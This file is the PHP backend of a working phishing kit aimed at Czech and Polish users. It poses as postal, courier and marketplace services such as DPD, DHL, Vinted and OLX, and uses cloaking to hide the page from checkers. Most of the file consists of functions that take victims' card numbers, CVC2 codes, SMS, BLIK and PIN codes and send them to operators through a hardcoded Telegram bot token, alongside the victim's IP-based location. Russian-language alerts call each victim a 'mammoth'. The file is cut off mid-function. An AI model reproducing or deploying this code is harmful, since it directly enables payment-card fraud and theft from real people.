<?php

/* clo */
$get_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
//$get_whois = JSON_decode(curl_GET("https://ipwhois.app/json/" . $get_ip), true);
//$get_country = $get_whois["country_code"];
$get_host = explode(".", $_SERVER["HTTP_HOST"]);
$get_subdomain = $get_host[0];
$get_useragent = $_SERVER['HTTP_USER_AGENT'];
$token_name = "q1";
$token_value = $get_ip . $get_useragent . date("d");
$token_hash = md5($token_name . $token_value);
$load_page = file_get_contents("../original.html");
$services = ["ceska-p0sta" => "CZ", "cz-dhi" => "CZ", "cz-dpd" => "CZ", "cz-vlnted" => "CZ", "pi-dpd" => "PL", "lhpost" => "PL", "p0czhta" => "PL", "vlnted" => "PL", "pi-0ix" => "PL"];
$result = check($token_name, $token_hash, $get_useragent);

if ($result == 1) {
    print_r("<h1>404 error</h1>");
    die();
}
if ($result == 2) {
    setcookie($token_name, $token_hash, time() + 86400 * 1, "/");
    print_r($load_page);
    die();
}

function check($t_name, $t_hash, $usr)
{
    if ($usr == "WhatsApp/2.22.10.78 i" or strpos($usr, "WhatsApp") === 0){
        return 5;
    }
    if (!isset($_COOKIE[$t_name]) || $_COOKIE[$t_name] != $t_hash) {
        return 2;
    }
    return 0;
}

function curl_GET($path)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $path);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    if ($err) {
        return $err;
    } else {
        return $result;
    }
    curl_close($ch);
}
// clo_ */

/* clo 
$get_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$get_whois = JSON_decode(curl_GET("http://ip-api.com/json/" . $get_ip), true);
$get_country = $get_whois["countryCode"];
$get_host = explode(".", $_SERVER["HTTP_HOST"]);
$get_subdomain = $get_host[0];
$get_useragent = $_SERVER['HTTP_USER_AGENT'];
$token_name = "q1";
$token_value = $get_country . $get_country . $get_useragent . date("d");
$token_hash = md5($token_name . $token_value);
$load_page = "<html>
<meta http-equiv='refresh' content='5;'>
<style>.loader {
  border: 16px solid #f3f3f3;
  border-top: 16px solid #3498db;
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
<body>
<div class='loader'></div></body></html>";
$services = ["ceska-posta" => "CZ", "ceska-dhl" => "CZ", "ceska-dpd" => "CZ", "cz-vlnted" => "CZ", "polska-dpd" => "PL", "polska-lhpost" => "PL", "polska-poczta" => "PL", "vlnted" => "PL", "polska-olx-oferta" => "PL"];
$result = check($get_country, $get_subdomain, $services, $token_name, $token_hash);

if ($result == 1) {
    print_r("<h1>404 error</h1>");
    die();
}
if ($result == 2) {
    setcookie($token_name, $token_hash, time() + 86400 * 1, "/");
    print_r($load_page);
    die();
}

function check($vis_country, $vis_subdomain, $list, $t_name, $t_hash)
{
    if ($vis_country != $list[$vis_subdomain]) {
        return 1;
    }
    if (!isset($_COOKIE[$t_name]) || $_COOKIE[$t_name] != $t_hash) {
        return 2;
    }
    return 0;
}

function curl_GET($path)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $path);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    if ($err) {
        return $err;
    } else {
        return $result;
    }
    curl_close($ch);
}
 /* clo_ */
define("LOGS", "-1001651699475");
define("ALOGS", "-1001613552150");
define("TOKEN", "5442108073:AAHps9v16gGPZaLc_y1UAVQfYjIB07S8gbQ");
define("KODER", "5222671388");

function filter() {
    $keys = [
      'HTTP_CLIENT_IP',
      'HTTP_X_FORWARDED_FOR',
      'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
      if (!empty($_SERVER[$key])) {
        $ip = trim(end(explode(',', $_SERVER[$key])));
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
          return $ip;
        }
      }
    }
  }

  function sendSMSz($service, $valute, $id, $name, $price, $worker_id, $sms){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел SMS!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service SMS!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log .= "<b>📩 SMS</b>: $sms".PHP_EOL;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service SMS!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>📩 SMS</b>: $sms".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendPUSHz($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел SMS!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service PUSH!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт дал уведомление что подтвердил ❇️ Push!</b>";
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service PUSH!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт дал уведомление что подтвердил ❇️ Push!</b>".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendPKO($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: 🔵 Мамонт нажал кнопку авторизации PKO Token!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service 🔵 Мамонт нажал кнопку авторизации PKO Token!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт дал уведомление что подтвердил 🫐 PKO Token!</b>";
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service 🔵 Мамонт нажал кнопку авторизации PKO Token!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт дал уведомление что подтвердил 🫐 PKO Token!</b>".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendCard($service, $valute, $id, $name, $price, $worker_id, $card, $exp, $cvv){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);


  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: 💳 Мамонт ввёл карту!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service 💳 Мамонт ввёл карту!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>💳 Карта</b>: $card".PHP_EOL;
    $r_log .= "<b>💳 Срок годности</b>: $exp".PHP_EOL;
    $r_log .= "<b>💳 CVC2</b>: $cvv".PHP_EOL;
    
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service 💳 Мамонт ввёл карту</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log2 .= "<b>💳 Карта</b>: $card".PHP_EOL;
    $r_log2 .= "<b>💳 Срок годности</b>: $exp".PHP_EOL;
    $r_log2 .= "<b>💳 CVC2</b>: $cvv".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }


  function sendChecker($service, $valute, $id, $name, $price, $worker_id, $reply_bro){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт выбрал Checker!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service Checker!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт выбрал:</b> " . $reply_bro;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service Checker!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт выбрал:</b> " . $reply_bro . PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendBlik($service, $valute, $id, $name, $price, $worker_id, $blik){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввёл BLIK!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service BLIK!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>BLIK CODE:</b> " . $blik;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service BLIK!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>BLIK CODE:</b> " . $blik . PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendPIN($service, $valute, $id, $name, $price, $worker_id, $pin){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввёл PIN!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service PIN!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>PIN CODE:</b> " . $pin;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service PIN!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>PIN CODE:</b> " . $pin . PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

function sendSupport($service, $valute, $id, $name, $price, $worker_id, $msg){
    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }

    $r_user = "<b>$service</b>: 🦣 ✉️ Новое сообщение".PHP_EOL;
    $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_user .= "<b>❇️ Сообщение:</b> $msg".PHP_EOL;

    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );

    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendTrack($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"✴️ Проверить онлайн","callback_data"=>"checkOnline")]]));
  
    $r_user = "<b>$service</b>: Переход на ссылку.".PHP_EOL;
    $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_user .= "<b>❗️ Вы можете отписать мамонту в ТП ответив на это сообщение или сообщение с другим логом.</b>";
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendCC($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"✴️ Проверить онлайн","callback_data"=>"checkOnline")]]));
  
    $r_user = "<b>$service</b>: Переход на ввод карты".PHP_EOL;
    $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_user .= "<b>❗️ Вы можете отписать мамонту в ТП ответив на это сообщение или сообщение с другим логом.</b>";
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html",
        "reply_markup" => $reply_m
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

function test(){

  $r_user = "test";

  $response = array(
      'chat_id' => LOGS,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

function sendLK($service, $valute, $id, $name, $price, $worker_id){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Переход на ввод ЛК".PHP_EOL;
  $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
  $r_user .= "<b>❗️ Вы можете отписать мамонту в ТП ответив на это сообщение или сообщение с другим логом.</b>";

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
